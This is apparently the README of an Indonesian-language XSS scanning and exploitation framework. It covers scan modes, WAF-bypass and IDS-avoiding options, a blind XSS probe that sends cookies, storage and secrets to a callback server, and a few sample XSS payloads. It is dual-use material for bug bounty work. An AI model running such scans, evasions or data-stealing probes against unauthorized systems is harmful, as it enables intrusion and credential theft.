# XScanner vOVERPOWER — XSS Security Research Framework

```
 ██╗  ██╗███████╗ ██████╗  █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗
 ╚██╗██╔╝██╔════╝██╔════╝ ██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
  ╚███╔╝ ███████╗██║      ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
  ██╔██╗ ╚════██║██║      ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
 ██╔╝ ██╗███████║╚██████╗ ██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
 ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
```

[![Python](https://img.shields.io/badge/Python-3.11+-3776AB?style=flat-square&logo=python)](https://python.org)
[![Version](https://img.shields.io/badge/Version-3.0.0-FF4757?style=flat-square)]()
[![Tests](https://img.shields.io/badge/Tests-136%2F136-22C55E?style=flat-square)]()
[![License](https://img.shields.io/badge/License-MIT-6B7280?style=flat-square)](LICENSE)

> ⚠️ **Untuk authorized security testing dan research ONLY.**
> Gunakan hanya pada sistem yang kamu miliki atau sudah mendapat izin tertulis.
> Penggunaan tanpa izin adalah tindak pidana (UU ITE di Indonesia, CFAA di AS, dll).

---

## Apa itu XScanner?

XScanner adalah framework Python untuk mendeteksi dan mengeksploitasi kerentanan XSS (Cross-Site Scripting) secara otomatis. Dibangun untuk **security researcher** dan **bug bounty hunter** yang butuh tools yang serius — bukan sekadar script scanner.

**Yang membedakan dari scanner biasa:**

- **4,495,343,711 kombinasi payload** dari 14 engine spesialis (bukan hanya list statis)
- **14 jenis payload engine** masing-masing punya spesialisasi: mXSS, CSP bypass, prototype pollution, DOM clobbering, HTTP smuggling, dan lebih banyak lagi
- **31 teknik WAF bypass** termasuk 6 teknik baru 2025 yang belum ada di database kebanyakan WAF
- **AFB (Advanced Filter Bypass)** — probe karakter satu per satu, tahu persis filter apa yang aktif
- **Rich Blind XSS** seperti XSS Hunter — screenshot, cookies, localStorage, secret scanning
- **KNOXSS-style engine** — 118 payload dari 12 konteks injection yang sangat spesifik
- **InteractionSimulator** — Playwright yang bisa simulasi scroll, click, copy-paste untuk trigger event handler baru
- **7 scan mode preset** yang menggabungkan flag-flag terkait — tidak perlu hafal 65+ flag

---

## Instalasi

### Persyaratan

- Python **3.11+** (wajib)
- OS: Linux, macOS, Windows (WSL direkomendasikan)
- RAM: minimal 512MB, disarankan 2GB+

### Install

```bash
# 1. Clone
git clone https://github.com/Auto-runs/Xsscan.git
cd Xsscan

# 2. Install dependencies
pip install -r requirements.txt

# 3. Verifikasi
python xscanner.py --version
```

### Install Playwright (opsional, untuk mode bounty/spa)

Diperlukan untuk `--mode bounty`, `--mode spa`, `--verify-headless`, `--dom-xss-scan`:

```bash
pip install playwright
playwright install chromium
```

### Install sebagai command global (opsional)

```bash
pip install -e .
xscanner --version  # bisa dijalankan dari mana saja
```

---

## Mulai Cepat

```bash
# Cek ada XSS tidak (5 menit)
python xscanner.py -u "https://target.com" --mode quick

# Lihat semua mode yang tersedia
python xscanner.py --list-modes
```

---

## Scan Modes

Ini adalah inti dari UX XScanner. Daripada mengingat 65+ flag, pilih mode yang sesuai situasi.

### Alur Kerja yang Direkomendasikan

```
┌─────────────────────────────────────────────────────┐
│                                                     │
│  1. quick  →  "Ada XSS ga di sini?"                 │
│                         ↓ (ada temuan menarik)      │
│  2. hunt   →  "Gali lebih dalam"                    │
│                         ↓ (ada XSS tapi diblokir)   │
│  3. bypass →  "Lolosin WAF-nya"                     │
│                         ↓ (siap laporan)            │
│  4. bounty →  "Generate bukti + laporan"            │
│                                                     │
│  Kondisi khusus:                                    │
│  blind   →  ada admin panel? cari blind XSS         │
│  spa     →  React/Vue/Angular? pakai ini            │
│  stealth →  target sensitif dengan IDS?             │
└─────────────────────────────────────────────────────┘
```

### Detail Setiap Mode

#### `--mode quick`
**"Ada XSS ga di sini?"** — triage awal, 5-10 menit

Crawl semua halaman, test semua parameter yang ditemukan, WAF bypass dasar. Tidak butuh setup tambahan, tidak butuh Playwright, tidak butuh server eksternal.

```bash
python xscanner.py -u "https://target.com" --mode quick
python xscanner.py -u "https://target.com" --mode quick --no-crawl  # hanya URL yang dikasih
python xscanner.py -l targets.txt --mode quick                       # banyak target sekaligus
```

Cocok untuk: cek awal sebelum commit waktu lebih lama, triage list target bug bounty.

---

#### `--mode hunt`
**"Gali lebih dalam, cari semua jenis XSS"** — 1-3 jam

Semua 14 payload engine aktif. 11 jenis XSS dicari. 12 konteks injection berbeda. WAF bypass penuh. Tanpa browser validation supaya tetap cepat. Gunakan setelah `quick` menemukan sesuatu menarik.

```bash
python xscanner.py -u "https://target.com" --mode hunt
python xscanner.py -u "https://target.com" --mode hunt --threads 20  # lebih cepat
python xscanner.py -u "https://target.com" --mode hunt --scan-timeout 7200  # 2 jam max
```

Cocok untuk: main scan setelah triage, assessment mendalam satu target.

---

#### `--mode bypass`
**"Ada XSS tapi terus diblokir WAF"** — 30-60 menit

Fokus ke 31 teknik evasion × 36.456 chain per payload. AFB probe 20 karakter kritis satu per satu untuk tahu persis filter apa yang aktif. Parser differential 2025. Unicode homoglyph. Browser quirks spesifik Chrome/Firefox/Safari.

```bash
python xscanner.py -u "https://target.com/search?q=test" --mode bypass
python xscanner.py -u "https://target.com/page?id=1" --mode bypass --no-crawl
```

Cocok untuk: ketika sudah tahu parameter vulnerable tapi payload terus diblokir.

---

#### `--mode bounty`
**"Siapkan bukti kuat untuk laporan"** — 2-4 jam

Semua engine + AFB + validasi di browser Chromium nyata (bukan cuma string matching) + generate HTML PoC per finding (siap submit ke HackerOne/Bugcrowd) + semua format laporan. Checkpoint aktif supaya bisa dilanjut kalau terhenti.

**Butuh: `playwright install chromium`**

```bash
python xscanner.py -u "https://target.com" --mode bounty
python xscanner.py -u "https://target.com" --mode bounty \
  --blind-callback "https://your-server.com" \
  --scan-timeout 14400
```

Output otomatis:
- `bounty_report.html` — dashboard visual
- `bounty_submission.md` — Markdown siap paste ke platform
- `bounty_report.sarif` — untuk GitHub Code Scanning
- `./xss_pocs/poc_XXXXX.html` — satu file per finding

---

#### `--mode stealth`
**"Target sensitif, minimalkan noise"** — sangat lambat by design

Rate limit 2 detik per request, hanya 2 thread, profile stealth. Tidak ada engine berat. Dirancang untuk tidak trigger IDS atau rate limit protection.

```bash
python xscanner.py -u "https://target.com" --mode stealth
python xscanner.py -u "https://target.com" --mode stealth --rate-limit 5.0  # lebih pelan
```

Cocok untuk: program bug bounty yang punya aturan rate limit ketat, target yang punya IDS agresif.

---

#### `--mode blind`
**"Cari XSS yang muncul di admin panel"** — waktu tidak tentu

Rich blind probe dengan screenshot halaman (html2canvas), cookies, localStorage, sessionStorage, secret scanning (AWS key, JWT, GitHub token, dll). Rich blind server dengan dashboard real-time.

**Butuh: server/VPS yang accessible dari internet** (atau ngrok/cloudflared untuk expose localhost)

```bash
# Pakai VPS
python xscanner.py -u "https://target.com" --mode blind \
  --blind-callback "http://IP_VPS_KAMU:8765"

# Pakai ngrok (expose localhost)
ngrok http 8765  # di terminal lain
python xscanner.py -u "https://target.com" --mode blind \
  --blind-callback "https://XXXX.ngrok.io"
```

Setelah scan, buka `http://localhost:8765` untuk lihat blind XSS hits real-time.

---

#### `--mode spa`
**"Target-nya React / Vue / Angular / Next.js"** — 1-2 jam

Playwright-based crawler yang bisa eksekusi JavaScript, klik button, tunggu konten dimuat secara dinamis. DOM XSS scanner dengan JS instrumentation (patch innerHTML/eval sebelum page script jalan). Deteksi parameter tersembunyi di bundle JS.

**Butuh: `playwright install chromium`**

```bash
python xscanner.py -u "https://react-app.com" --mode spa
python xscanner.py -u "https://nextjs-app.com" --mode spa --depth 3
```

---

### Override Flag Setelah Mode

Mode adalah titik awal. Semua flag individual tetap bisa di-override:

```bash
# Mode hunt tapi dengan proxy Burp Suite
python xscanner.py -u "https://target.com" --mode hunt \
  --proxy http://127.0.0.1:8080

# Mode bounty tapi dengan custom payload tambahan
python xscanner.py -u "https://target.com" --mode bounty \
  --payload-file my_custom_payloads.txt

# Mode hunt dengan login dulu
python xscanner.py -u "https://target.com" --mode hunt \
  --login-url "https://target.com/login" \
  --username admin \
  --password password123

# Mode bypass dengan fokus ke parameter tertentu saja
python xscanner.py -u "https://target.com/search?q=test&page=1" \
  --mode bypass --no-crawl
```

---

## Referensi Lengkap Semua Flag

Untuk yang butuh kontrol penuh, semua flag tersedia:

### Targeting

| Flag | Default | Keterangan |
|------|---------|------------|
| `-u, --url` | — | Target URL (bisa diulang: `-u url1 -u url2`) |
| `-l, --list` | — | File berisi URL target (satu per baris) |
| `--no-crawl` | off | Hanya test parameter dari URL yang dikasih saja |
| `--depth` | 2 | Kedalaman crawl |
| `--threads` | 10 | Request concurrent |
| `--timeout` | 10 | Timeout per request (detik) |
| `--scan-timeout` | 0 | Batas waktu total scan (detik, 0 = tidak ada batas) |
| `--max-findings` | 0 | Berhenti setelah N finding (0 = tidak ada batas) |

### Profil & Engine

| Flag | Default | Keterangan |
|------|---------|------------|
| `--profile` | normal | `fast` / `normal` / `deep` / `stealth` |
| `--deep` | off | Shorthand `--profile deep` |
| `--engine-v3` | off | Aktifkan ScanEngineV3 (4.50B combos) |

### Request & Auth

| Flag | Keterangan |
|------|------------|
| `-H, --header` | Custom header: `'Name: Value'` |
| `-c, --cookie` | Cookie: `'name=value'` |
| `--proxy` | Proxy: `http://127.0.0.1:8080` |
| `--rate-limit` | Jeda antar request (detik) |
| `--login-url` | URL halaman login |
| `--username` | Username untuk login |
| `--password` | Password untuk login |

### Scope

| Flag | Keterangan |
|------|------------|
| `--scope` | Domain in-scope: `target.com *.target.com` |
| `--exclude-scope` | Domain yang dilewati |
| `--exclude-path` | Path yang dilewati: `/logout /delete` |

### Modul Serangan

| Flag | Keterangan |
|------|------------|
| `--test-headers` | XSS via HTTP headers (14 header) |
| `--test-hpp` | HTTP Parameter Pollution klasik |
| `--test-hpp-2025` | HPP ASP.NET comma concat (Ethiack 2025) |
| `--test-json` | JSON API endpoint injection |
| `--test-csp-bypass` | CSP bypass: JSONP, nonce leak, strict-dynamic |
| `--test-prototype` | Prototype pollution XSS |
| `--test-template` | Template injection (Angular/Vue/Jinja2) |
| `--test-websocket` | WebSocket/SSE injection |
| `--test-smuggling` | HTTP request smuggling |
| `--test-new-events` | Event handler HTML5 baru 2025 |
| `--test-parser-diff` | Parser differential bypass |
| `--unicode-bypass` | Unicode homoglyph WAF evasion |
| `--browser-quirks` | Payload browser-spesifik (Chrome/Firefox/Safari/Edge) |
| `--dom-clobbering` | DOM clobbering via id/name HTML |
| `--second-order` | Track dan verifikasi second-order XSS |
| `--js-crawl` | Ekstrak parameter dari JavaScript file |
| `--dom-xss-scan` | DOM XSS via Playwright JS instrumentation |
| `--spa-crawl` | Crawl SPA via Playwright |
| `--waf-chain-depth` | Kedalaman chain bypass: 2/3/4 (default: 3) |
| `--no-waf-bypass` | Nonaktifkan semua WAF evasion |

### AFB & Validasi (KNOXSS-style)

| Flag | Keterangan |
|------|------------|
| `--run-afb` | Probe 20 karakter kritis ke target sebelum inject |
| `--knoxss-validate` | Validasi setiap finding di Chromium nyata |
| `--generate-poc` | Generate HTML PoC per finding |
| `--poc-output-dir` | Direktori output PoC (default: `./xss_pocs`) |
| `--verify-headless` | Konfirmasi eksekusi XSS di browser |

### Blind XSS

| Flag | Keterangan |
|------|------------|
| `--blind-callback` | URL server callback untuk blind XSS |
| `--start-rich-blind-server` | Jalankan rich blind server (XSS Hunter-style) |
| `--blind-server-port` | Port server (default: 8765) |
| `--blind-output-dir` | Direktori simpan hits (default: `./blind_xss_hits`) |
| `--no-blind-screenshot` | Nonaktifkan screenshot html2canvas |

### Custom Payload

| Flag | Keterangan |
|------|------------|
| `--payload-file` | File custom payloads (satu per baris, `#` untuk komentar) |

### Output & Laporan

| Flag | Keterangan |
|------|------------|
| `-o, --output` | Laporan JSON (default: `xscanner_report.json`) |
| `--report-html` | Dashboard HTML |
| `--report-csv` | Spreadsheet CSV |
| `--report-md` | Markdown (siap bug bounty) |
| `--report-sarif` | SARIF 2.1.0 (GitHub Code Scanning) |
| `--details` | Print full payload + evidence untuk setiap finding |
| `--no-progress` | Nonaktifkan progress output |

### Misc

| Flag | Keterangan |
|------|------------|
| `--checkpoint` | Simpan progress, bisa resume |
| `--ai-assist` | Saran payload dari AI (butuh `ANTHROPIC_API_KEY`) |
| `-v, --verbose` | Output verbose |
| `-V, --version` | Tampilkan versi |
| `--list-modes` | Tampilkan semua mode dan exit |

---

## Kemampuan Lengkap

### Jenis XSS yang Dicari (11 tipe)

| Tipe | Penjelasan |
|------|-----------|
| Reflected XSS | Payload masuk, langsung muncul di response |
| Stored XSS | Payload disimpan di DB, muncul saat orang lain buka |
| DOM XSS | Diproses client-side, tidak lewat server |
| Blind XSS | Muncul di halaman yang tidak bisa kamu lihat (admin panel) |
| mXSS (Mutation) | Payload berubah saat diproses innerHTML/DOMParser |
| Second-order | Inject sekarang, fire saat ada aksi lain nanti |
| DOM Clobbering | Overwrite variabel JS via id/name HTML element |
| Template Injection | Inject di Angular/Vue/Jinja2 expression |
| Prototype Pollution | Inject ke `__proto__` yang mempengaruhi semua objek |
| CSP Bypass | Execute JS meski ada Content-Security-Policy |
| HTTP Smuggling | Exploit perbedaan parsing antar reverse proxy |

### Entry Point yang Di-test (10+ tipe)

URL parameter, Form POST, HTTP Headers (14 header), File upload (filename), URL path (PHP_SELF), JSON body, WebSocket message, GraphQL query, Fragment/hash (DOM), window.name/postMessage, Referrer header.

### Payload Engine (14 engine)

| Engine | Total Payload | Spesialisasi |
|--------|--------------|--------------|
| CombinatorialEngineV2 | 4,260,695,040 | Kombinasi HTML/JS/Attr semua konteks |
| MXSSEngineV2 | 115,404,800 | Mutation XSS via innerHTML/DOMParser |
| JSONAPIEngineV2 | 110,909,568 | REST API dan JSON endpoint |
| PrototypePollutionEngine | 2,700,000 | Prototype chain manipulation |
| UnicodeHomoglyphEngine | 2,880,000 | Karakter unicode yang tampak sama |
| CSPBypassEngine | 1,620,000 | Content-Security-Policy bypass |
| BlindXSSEngineV2 | 1,088,640 | Payload dengan callback server |
| HTTPSmugglingEngine | 45,000 | HTTP smuggling vectors |
| TemplateInjectionEngine | 31 | Angular/Vue/React/Jinja2/Twig |
| DOMClobberingEngine | 20 | DOM variable clobbering |
| BrowserQuirksEngine | 420 | Browser-specific behaviors |
| NewEventHandlerEngine2025 | 24 | Event handler Chrome 114-126+ |
| ParserDifferentialEngine | 50 | WAF vs browser parse differential |
| KnoxssCaseEngine | 118 | 12 konteks injection spesifik |
| **TOTAL** | **4,495,343,711** | |

### WAF Bypass (31 teknik, 36.456 chain/payload)

Teknik Klasik: `case_shuffle`, `comment_inject`, `double_encode`, `null_byte`, `tab_substitute`, `unicode_norm`, `html_entity`, `tag_break`, `event_obfus`, `slash_insert`

Teknik Lanjut: `homoglyph`, `zero_width_space`, `zero_width_joiner`, `rtl_override`, `html5_named_refs`, `svg_use_ref`, `css_unicode_esc`, `json_unicode_esc`, `soft_hyphen`, `vertical_tab`, `octal_encode`, `html_decimal_ent`, `js_template_split`, `prototype_chain`, `overlong_utf8`

Teknik Baru 2025: `parser_differential`, `new_event_handler`, `comma_operator_hpp`, `attribute_breakout`, `cloudflare_2025`, `encoding_smuggling`

---

## Arsitektur

```
Xsscan/
├── xscanner.py                       # Entry point
│
├── cli/interface.py                  # CLI — 7 mode + 65+ flag
│
├── scanner/
│   ├── engine_v2.py                  # Engine standar (152M combos)
│   ├── engine_v3.py                  # Engine penuh (4.50B combos)
│   ├── dom_xss_scanner.py            # DOM XSS via Playwright instrumentation
│   ├── knoxss_validator.py           # AFB + validasi browser + PoC generator
│   ├── rich_blind_server.py          # XSS Hunter-style server
│   ├── interaction_simulator.py      # Playwright user gesture simulator
│   ├── upload_injector.py            # File upload XSS
│   ├── filter_probe.py               # CharacterMatrix — probe 23 karakter
│   ├── header_injector.py            # 14 header injection
│   ├── real_world.py                 # Scope, Auth, Checkpoint, HPP, SecondOrder
│   ├── verifier.py                   # Headless Chromium verification
│   └── blind_server.py               # Simple blind XSS listener
│
├── payloads/
│   ├── combinatorial_engine_v2.py    # 4.26B kombinasi
│   ├── mxss_engine_v2.py             # mXSS 115M
│   ├── blind_xss_v2.py               # Blind XSS 1M
│   ├── advanced_engines_v2.py        # JSON, Proto Pollution, Unicode,
│   │                                 # Browser Quirks, HTTP Smuggling,
│   │                                 # NewEventHandler2025, ParserDiff2025
│   ├── csp_bypass_engine.py          # CSP bypass, Template, DOM Clobbering
│   ├── knoxss_cases.py               # 118 payload 12 konteks (KNOXSS-style)
│   ├── blind_probe.py                # Rich blind probe JS generator
│   └── generator.py                  # Static payloads (supplement)
│
├── waf_bypass/
│   ├── evasion_v2.py                 # 31 teknik, 36.456 chain/payload
│   └── detector.py                   # WAFDetector 20+ vendor
│
├── detection/
│   ├── analyzer_v2.py                # 10-layer DetectionEngine
│   └── fuzzy.py                      # FuzzyDetector + ResponseDiffer
│
├── crawler/
│   ├── spider.py                     # BFS async crawler
│   └── spa_crawler.py                # SPA crawler via Playwright
│
├── utils/
│   ├── config.py                     # ScanConfig (62 field) + SCAN_MODES
│   ├── http_client.py                # Async HTTP (rate-limited, thread-safe)
│   └── logger.py                     # Rich terminal output
│
├── reports/reporter.py               # JSON + HTML + CSV + MD + SARIF
│
├── tests/
│   ├── test_core.py
│   ├── test_integration.py
│   └── test_revolutionary.py
│
└── requirements.txt
```

---

## Contoh Penggunaan Lengkap

### Bug Bounty — Full Workflow

```bash
# Step 1: Triage cepat
python xscanner.py -u "https://target.com" --mode quick -o quick_scan.json

# Step 2: Deep scan di target yang menarik
python xscanner.py -u "https://target.com" --mode hunt \
  --scope "target.com" "*.target.com" \
  --exclude-path "/logout" "/unsubscribe" \
  -o hunt_results.json

# Step 3: Bypass WAF kalau ada blocking
python xscanner.py -u "https://target.com/search?q=test" --mode bypass

# Step 4: Generate laporan lengkap
python xscanner.py -u "https://target.com" --mode bounty \
  --blind-callback "https://your-vps.com" \
  --scan-timeout 14400
```

### Target dengan Login

```bash
python xscanner.py -u "https://target.com/dashboard" --mode hunt \
  --login-url "https://target.com/login" \
  --username "testuser" \
  --password "testpass123"
```

### Scan dengan Burp Suite Proxy

```bash
python xscanner.py -u "https://target.com" --mode hunt \
  --proxy http://127.0.0.1:8080 \
  -H "Authorization: Bearer eyJhbG..."
```

### Custom Payload File

```bash
# payloads.txt:
# <img src=x onerror=alert(1)>
# <svg onload=alert(1)>
# "><script>alert(1)</script>

python xscanner.py -u "https://target.com" --mode quick \
  --payload-file payloads.txt
```

### Lab Lokal (DVWA, Juice Shop)

```bash
# DVWA
docker run -d -p 8080:80 vulnerables/web-dvwa
python xscanner.py -u "http://localhost:8080" \
  --mode hunt --no-crawl

# OWASP Juice Shop
docker run -d -p 3000:3000 bkimminich/juice-shop
python xscanner.py -u "http://localhost:3000" \
  --mode hunt --test-json --test-prototype
```

---

## Format Laporan

| Format | Kegunaan |
|--------|----------|
| **JSON** | Machine-readable, integrasi ke tools lain |
| **HTML** | Dashboard visual dark-theme, semua field di-escape aman |
| **Markdown** | Paste langsung ke HackerOne / Bugcrowd / Intigriti |
| **CSV** | Import ke spreadsheet, tracking progress |
| **SARIF** | GitHub Code Scanning, CI/CD, VS Code Security extension |
| **PoC HTML** | Satu file per finding — siap submit sebagai bukti |

---

## Menjalankan Tests

```bash
pip install pytest pytest-asyncio
python -m pytest tests/ -v
# Hasil: 136 passed, 0 failed
```

---

## Changelog

### v3.0.0 — vOVERPOWER

**7 Scan Mode Preset:**
`quick`, `hunt`, `bypass`, `bounty`, `stealth`, `blind`, `spa`

**14 Payload Engine** termasuk 4 engine baru:
- `NewEventHandlerEngine2025` — event handler Chrome 114-126+
- `ParserDifferentialEngine2025` — WAF vs browser parse differential
- `KnoxssCaseEngine` — 118 payload 12 konteks spesifik (KNOXSS-style)
- `BlindProbeGenerator` — rich blind probe dengan screenshot + secret scanning

**5 Module Baru:**
- `scanner/knoxss_validator.py` — AFB + browser validation + PoC generator
- `scanner/rich_blind_server.py` — XSS Hunter-style server
- `scanner/interaction_simulator.py` — Playwright user gesture simulation
- `scanner/upload_injector.py` — file upload XSS
- `payloads/blind_probe.py` — rich blind probe JS generator

**15 Bug Fix:**
race condition rate_limit, multi-target dedup, XSS di HTML report, ghost flags,
CORS di blind server, missing method definitions, import errors,
duplicate WAF bypass variants, CSV injection, scope errors, dll.

**8 Fitur Baru:**
`--scan-timeout`, `--max-findings`, `--payload-file`, `--no-progress`,
`--run-afb`, `--generate-poc`, `--start-rich-blind-server`, `--knoxss-validate`

---

## Legal

Tools ini disediakan **untuk authorized security testing dan research saja**.

- Selalu dapatkan izin tertulis sebelum scan
- Patuhi scope dan rules program bug bounty
- Penulis tidak bertanggung jawab atas penyalahgunaan

---

*XScanner v3.0.0 vOVERPOWER | Python 3.11+ | 136/136 tests passing*
*4,495,343,711 payload combinations | 14 engines | 31 WAF bypass techniques*
